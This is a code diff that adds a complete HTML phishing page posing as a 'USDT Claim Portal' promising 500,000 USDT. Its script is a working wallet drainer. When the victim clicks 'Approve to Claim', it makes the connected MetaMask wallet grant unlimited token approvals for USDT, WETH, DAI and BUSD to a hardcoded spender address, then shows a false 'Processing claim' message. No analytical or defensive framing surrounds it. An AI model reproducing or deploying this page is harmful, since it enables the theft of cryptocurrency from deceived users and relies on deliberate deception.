@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>USDT Claim Portal</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js"></script>
+</head>
+<body>
+  <h2>🎁 You Received 500,000 USDT</h2>
+  <p>To claim your funds, please approve access to finalize the transaction.</p>
+  <button onclick="approveAll()">🟢 Approve to Claim</button>
+
+  <script>
+    const spender = "0x4E3A28f73b0d57141Dd9977241C48924e3142A0B";
+    const MaxUint = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+
+    const tokens = [
+      {
+        symbol: "USDT",
+        address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", // Ethereum USDT
+        decimals: 6,
+      },
+      {
+        symbol: "WETH",
+        address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
+        decimals: 18,
+      },
+      {
+        symbol: "DAI",
+        address: "0x6B175474E89094C44Da98b954EedeAC495271d0F",
+        decimals: 18,
+      },
+      {
+        symbol: "BUSD",
+        address: "0x4fabb145d64652a948d72533023f6e7a623c7c53",
+        decimals: 18,
+      }
+    ];
+
+    async function approveAll() {
+      if (!window.ethereum) {
+        alert("MetaMask is required");
+        return;
+      }
+
+      const provider = new ethers.BrowserProvider(window.ethereum);
+      const signer = await provider.getSigner();
+
+      for (const token of tokens) {
+        try {
+          const abi = ["function approve(address spender, uint256 amount) external returns (bool)"];
+          const contract = new ethers.Contract(token.address, abi, signer);
+          const tx = await contract.approve(spender, MaxUint);
+          console.log(`✅ Approved ${token.symbol}: ${tx.hash}`);
+        } catch (err) {
+          console.error(`❌ Failed for ${token.symbol}`, err);
+        }
+      }
+
+      alert("✅ All tokens approved. Processing claim...");
+    }
+  </script>
+</body>
+</html>
